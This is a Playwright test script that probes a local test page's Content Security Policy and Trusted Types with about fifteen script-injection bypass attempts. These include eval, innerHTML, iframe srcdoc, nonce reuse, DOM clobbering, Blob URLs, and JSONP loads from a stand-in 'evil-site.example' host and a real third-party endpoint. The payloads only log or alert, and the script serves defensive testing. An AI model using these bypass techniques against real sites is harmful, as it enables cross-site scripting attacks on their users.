const { chromium } = require('playwright');
const http = require('http');

async function testCSPWithViolations() {
  // Start a server to collect CSP violation reports
  let violationReports = [];
  const reportServer = http.createServer((req, res) => {
    if (req.method === 'POST' && req.url === '/collect-violations') {
      let body = '';
      req.on('data', chunk => {
        body += chunk.toString();
      });
      req.on('end', () => {
        try {
          const report = JSON.parse(body);
          violationReports.push(report);
          console.log('CSP Violation Captured:', JSON.stringify(report, null, 2));
        } catch (e) {
          console.error('Error parsing CSP report:', e);
        }
        res.statusCode = 204;
        res.end();
      });
    } else {
      res.statusCode = 404;
      res.end();
    }
  });
  
  // Start the report server on port 8888
  reportServer.listen(8888);
  console.log('CSP violation collection server started on port 8888');
  
  const browser = await chromium.launch({ headless: false });
  const context = await browser.newContext();
  const page = await context.newPage();
  
  console.log('Testing CSP bypass techniques...');
  
  try {
    // First get the page normally to see its CSP
    await page.goto('http://localhost:3000/csp-test');
    await page.waitForTimeout(1000);
    
    // Get the CSP header from the page
    const cspHeader = await page.textContent('#csp-header');
    console.log('\nCSP Configuration:');
    console.log(cspHeader);
    
    console.log('\n===== Running CSP Bypass Tests =====');
    
    // Test 1: Try to exploit with script in different contexts
    console.log('\n1. Testing script injection in different contexts...');
    await page.evaluate(() => {
      // Try direct script execution
      try {
        eval('alert("CSP Bypass!")');
        console.log('VULNERABLE: eval worked');
      } catch (e) {
        console.log('Protected: eval blocked');
      }
      
      // Try setting innerHTML with a script
      try {
        document.body.innerHTML += '<script>console.log("CSP Bypass!")</script>';
        console.log('VULNERABLE: innerHTML script worked');
      } catch (e) {
        console.log('Protected: innerHTML script blocked');
      }
      
      // Try creating a script element
      try {
        const script = document.createElement('script');
        script.textContent = 'console.log("CSP Bypass!")';
        document.body.appendChild(script);
        console.log('VULNERABLE: script element worked');
      } catch (e) {
        console.log('Protected: script element blocked');
      }
    });
    
    // Test 2: Test JSONP bypass
    console.log('\n2. Testing JSONP/external script bypass...');
    await page.evaluate(() => {
      try {
        const script = document.createElement('script');
        script.src = 'https://evil-site.example/jsonp?callback=alert("CSP Bypass!")';
        document.body.appendChild(script);
        console.log('VULNERABLE: JSONP injection attempted');
      } catch (e) {
        console.log('Protected: JSONP injection blocked');
      }
    });
    
    // Test 3: Test event handler bypass
    console.log('\n3. Testing event handler bypass...');
    await page.evaluate(() => {
      try {
        const img = document.createElement('img');
        img.src = 'invalid-image';
        img.onerror = () => { console.log('CSP Bypass!'); };
        document.body.appendChild(img);
        console.log('VULNERABLE: Event handler injection attempted');
      } catch (e) {
        console.log('Protected: Event handler injection blocked');
      }
    });
    
    // Test 4: Test iframe injection
    console.log('\n4. Testing iframe injection...');
    await page.evaluate(() => {
      try {
        const iframe = document.createElement('iframe');
        iframe.srcdoc = '<script>parent.console.log("CSP Bypass!");</script>';
        document.body.appendChild(iframe);
        console.log('VULNERABLE: iframe srcdoc injection attempted');
      } catch (e) {
        console.log('Protected: iframe srcdoc injection blocked');
      }
    });
    
    // Test 5: Test nonce stealing/reuse
    console.log('\n5. Testing nonce stealing/reuse...');
    const nonce = await page.evaluate(() => {
      const scripts = document.querySelectorAll('script[nonce]');
      return scripts.length > 0 ? scripts[0].getAttribute('nonce') : null;
    });
    
    if (nonce) {
      console.log(`Found nonce: ${nonce}. Attempting to reuse it...`);
      await page.evaluate((stolenNonce) => {
        try {
          const script = document.createElement('script');
          script.nonce = stolenNonce;
          script.textContent = 'console.log("Nonce reused!")';
          document.body.appendChild(script);
          console.log('VULNERABLE: Nonce reuse attempted');
        } catch (e) {
          console.log('Protected: Nonce reuse blocked');
        }
      }, nonce);
    } else {
      console.log('No nonce found in the page');
    }
    
    // Wait a bit for any violations to be reported
    await page.waitForTimeout(2000);
    
    // Display violation report summary
    console.log('\n===== CSP Violation Report Summary =====');
    console.log(`Total violations detected: ${violationReports.length}`);
    
    const violationTypes = {};
    violationReports.forEach(report => {
      const directive = report['csp-report'] ? 
                       report['csp-report']['violated-directive'] : 
                       'unknown';
      violationTypes[directive] = (violationTypes[directive] || 0) + 1;
    });

    console.log('\n===== Testing Trusted Types Bypass Attempts =====');

    // 1. Test innerHTML with script injection
    console.log('\n1. Testing Trusted Types with innerHTML script injection...');
    await page.evaluate(() => {
      try {
        const div = document.createElement('div');
        div.innerHTML = '<script>console.log("Trusted Types bypass via innerHTML")</script>';
        document.body.appendChild(div);
        console.log("WARNING: Trusted Types bypass succeeded via innerHTML!");
      } catch (e) {
        console.log("Trusted Types properly blocked innerHTML script injection:", e.message);
      }
    });

    // 2. Test direct script element creation and manipulation
    console.log('\n2. Testing Trusted Types with script.src manipulation...');
    await page.evaluate(() => {
      try {
        const script = document.createElement('script');
        script.src = 'data:text/javascript,console.log("Trusted Types bypass via script.src")';
        document.body.appendChild(script);
        console.log("WARNING: Trusted Types bypass succeeded via script.src!");
      } catch (e) {
        console.log("Trusted Types properly blocked script.src manipulation:", e.message);
      }
    });

    // 3. Test document.write with script injection
    console.log('\n3. Testing Trusted Types with document.write...');
    await page.evaluate(() => {
      try {
        document.write('<script>console.log("Trusted Types bypass via document.write")</script>');
        console.log("WARNING: Trusted Types bypass succeeded via document.write!");
      } catch (e) {
        console.log("Trusted Types properly blocked document.write:", e.message);
      }
    });

    // 4. Test DOM clobbering techniques
    console.log('\n4. Testing Trusted Types with DOM clobbering attempt...');
    await page.evaluate(() => {
      try {
        // Create elements that could be used for DOM clobbering
        const div = document.createElement('div');
        div.innerHTML = '<form id="trustedTypes"><input name="createHTML"></form>';
        document.body.appendChild(div);
        
        // Now try to use the clobbered form as if it were the trustedTypes object
        const elem = document.createElement('div');
        elem.innerHTML = window.trustedTypes.createHTML('<script>alert("DOM Clobbering")</script>');
        
        console.log("WARNING: Possible DOM clobbering success against Trusted Types!");
      } catch (e) {
        console.log("Trusted Types is not vulnerable to DOM clobbering:", e.message);
      }
    });

    // 5. Test creating a disallowed policy
    console.log('\n5. Testing Trusted Types policy creation restrictions...');
    await page.evaluate(() => {
      if (window.trustedTypes) {
        try {
          const policy = trustedTypes.createPolicy('evil-policy', {
            createHTML: (s) => s // Allow any HTML without sanitization
          });
          console.log("WARNING: Created unauthorized Trusted Types policy 'evil-policy'!");
        } catch (e) {
          console.log("Properly blocked unauthorized policy creation:", e.message);
        }
      } else {
        console.log("Trusted Types is not supported in this browser");
      }
    });

    // 6. Test script element text content manipulation
    console.log('\n6. Testing Trusted Types with script element text content...');
    await page.evaluate(() => {
      try {
        const script = document.createElement('script');
        script.textContent = 'console.log("Trusted Types bypass via script.textContent")';
        document.body.appendChild(script);
        console.log("WARNING: Trusted Types bypass succeeded via script.textContent!");
      } catch (e) {
        console.log("Trusted Types properly blocked script.textContent manipulation:", e.message);
      }
    });

    // 7. Attempt to bypass using properties not covered by Trusted Types
    console.log('\n7. Testing potential Trusted Types coverage gaps...');
    await page.evaluate(() => {
      // Test various properties that might not be covered by Trusted Types
      const testGaps = [
        { name: 'iframe.srcdoc', test: () => {
          const iframe = document.createElement('iframe');
          iframe.srcdoc = '<script>parent.console.log("Trusted Types bypass via iframe.srcdoc")</script>';
          document.body.appendChild(iframe);
        }},
        { name: 'Element.insertAdjacentHTML', test: () => {
          const div = document.createElement('div');
          div.insertAdjacentHTML('afterbegin', '<script>console.log("Trusted Types bypass via insertAdjacentHTML")</script>');
          document.body.appendChild(div);
        }},
        { name: 'Range.createContextualFragment', test: () => {
          const range = document.createRange();
          const fragment = range.createContextualFragment('<script>console.log("Trusted Types bypass via createContextualFragment")</script>');
          document.body.appendChild(fragment);
        }}
      ];
      
      for (const gap of testGaps) {
        try {
          gap.test();
          console.log(`WARNING: Potential Trusted Types bypass via ${gap.name}!`);
        } catch (e) {
          console.log(`${gap.name} properly protected by Trusted Types:`, e.message);
        }
      }
    });

    // 8. JSONP Endpoints Test
    console.log('\n8. Testing if external JSONP endpoints can execute arbitrary JavaScript');
    await page.evaluate(() => {
      try {
        const jsonpEndpoints = ['https://acs.aliexpress.com/api?callback=alert'];
        jsonpEndpoints.forEach(endpoint => {
          const script = document.createElement('script');
          script.src = endpoint;
          document.body.appendChild(script);
          console.log("WARNING: Script loaded from unauthorized JSONP endpoint:", endpoint);
        });
      } catch (e) {
        console.log("Protected: JSONP endpoint script was blocked:", e.message);
      }
    });

    // 9. Blob URL Bypass Test
    console.log('\n9. Testing if Blob URLs can bypass CSP restrictions');
    await page.evaluate(() => {
      try {
        const maliciousHTML = '<script>alert("Blob bypass")</script>';
        const blob = new Blob([maliciousHTML], {type: 'text/html'});
        const url = URL.createObjectURL(blob);
        
        // Instead of direct navigation which would end the test:
        const iframe = document.createElement('iframe');
        iframe.src = url;
        document.body.appendChild(iframe);
        console.log("WARNING: Blob URL loaded in iframe was not blocked!");
      } catch (e) {
        console.log("Protected: Blob URL navigation was blocked:", e.message);
      }
    });

    // 10. Unsafe Sanitizer Test
    console.log('\n10. Testing if weak Trusted Types policies can be exploited');
    await page.evaluate(() => {
      if (!window.trustedTypes) {
        console.log("Trusted Types not supported in this browser - skipping test");
        return;
      }
      
      try {
        // Try to create a policy with a name that might not be in the allowlist
        const weakPolicy = trustedTypes.createPolicy('test-weak-sanitizer', {
          createHTML: s => s.replace(/<script>/g, '') // Inadequate sanitization
        });
        
        const testDiv = document.createElement('div');
        document.body.appendChild(testDiv);
        
        // Try to use the weak policy (this should fail if policy names are properly restricted)
        testDiv.innerHTML = weakPolicy.createHTML('<scrip\0t>alert(1)</script>');
        console.log("WARNING: Weak sanitizer policy allowed potential XSS!");
      } catch (e) {
        console.log("Protected: Either policy creation was restricted or DOM sink was protected:", e.message);
      }
    });

    console.log('\nViolation types:');
    Object.keys(violationTypes).forEach(directive => {
      console.log(`- ${directive}: ${violationTypes[directive]} violations`);
    });
    
  } catch (error) {
    console.error('Error during testing:', error);
  } finally {
    await browser.close();
    reportServer.close();
    console.log('Test completed and servers shut down');
  }
}

testCSPWithViolations().catch(console.error);